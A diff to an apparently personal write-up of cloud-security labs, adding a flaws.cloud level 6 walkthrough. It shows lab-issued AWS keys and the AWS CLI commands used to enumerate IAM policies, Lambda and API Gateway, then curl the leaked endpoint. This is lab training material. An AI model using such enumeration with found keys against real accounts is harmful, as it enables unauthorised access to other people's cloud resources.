@@ -6,7 +6,7 @@ header:
   show_overlay_excerpt: false
 ---
 
-<b><i>bruno from the future, don't forget to add an index, spellcheck and proof read, and maybe rearrange the section order</i></b>
+<b><i>bruno from the future, don't forget to add an index, spellcheck, proof read, and maybe reorder the sections</i></b>
 
 
 
@@ -732,14 +732,101 @@ Access key ID: AKIAJFQ6E7BY57Q3OBGA
 Secret: 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
 ```
 
+Starting with basic enumeration, we check our identity and our permissions
+```
+┌──(kali㉿kali)-[~]
+└─$ aws --profile SecurityAudit sts get-caller-identity                                         
+{
+    "UserId": "AIDAIRMDOSCWGLCDWOG6A",
+    "Account": "975426262029",
+    "Arn": "arn:aws:iam::975426262029:user/Level6"
+}
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ aws --profile SecurityAudit iam list-attached-user-policies --user-name Level6
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "MySecurityAudit",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
+        },
+        {
+            "PolicyName": "list_apigateways",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
+        }
+    ]
+}
+```
+To enumerate the policies, use the combination of these two commands. For each of them, list their policy versions and then go deeper with `get-policy-version` for each version. Obviously replace the policy-arn, version-id and profile as desired.
+```
+aws --profile SecurityAudit iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
+aws --profile SecurityAudit iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
+```
+
+The most relevant things I found from this were:
+* MySecurityAudit role is extremely permissive, including with Lambda functions
+* There are references to an API gateway resource called `puspzvwgb6/*` and `/restapis/puspzvwgb6/stages` 
+
+Enumerating lambda...
+```
+──(kali㉿kali)-[~]
+└─$ aws --profile SecurityAudit lambda list-functions --region us-west-2
+{
+    "Functions": [
+        {
+            "FunctionName": "Level6",
+            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
+            "Runtime": "python2.7",
+<snip>
+```
+In the policy associated with it, not how the REST API id was leaked in the `SourceArn` field
+```
+┌──(kali㉿kali)-[~]
+└─$ aws --profile SecurityAudit lambda get-policy --function-name Level6 --region us-west-2     
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
+    "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
+}
+```
+The API URL format should look something like this `https://<REST_api_id>.execute-api.<region>.amazonaws.com/<API_stage_name>/<function>`. We have the id, the region and the function. The stage name can be fetched with
+```
+┌──(kali㉿kali)-[~]
+└─$ aws --profile SecurityAudit apigateway get-stages --rest-api-id s33ppypa75 --region us-west-2
+{
+    "item": [
+        {
+            "deploymentId": "8gppiv",
+            "stageName": "Prod",
+            "cacheClusterEnabled": false,
+<snip>
+```
+
+So the full URL is going to be `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/Level6`. Lesson learned: use lower case :)
+```
+┌──(kali㉿kali)-[~]
+└─$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/Level6
+{"message": "Internal server error"}                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
+```
+
+<p align="center">
+  <img width="70%" src="https://github.com/user-attachments/assets/5114b201-b2d8-46b7-a90c-380cc9508e90"/>
+</p>
+
+
+This was pretty fun, barely any setup needed and great for someone starting out. I really liked how it explains what went so wrong that made it possible to exploit each vulnerability. Looking forward to flaws2!
 
 <br>
 
 ## flaws2.cloud (attacker path)
 
+
+<br>
+
 ## pwnedlabs.io
 
-A lot of people recommended this one to me, but it is not a free resource, at least beyond the very basics. I decided to keep it anyway since it seems to have a really good reputation.
 
 ## HTB Fortress: AWS
 
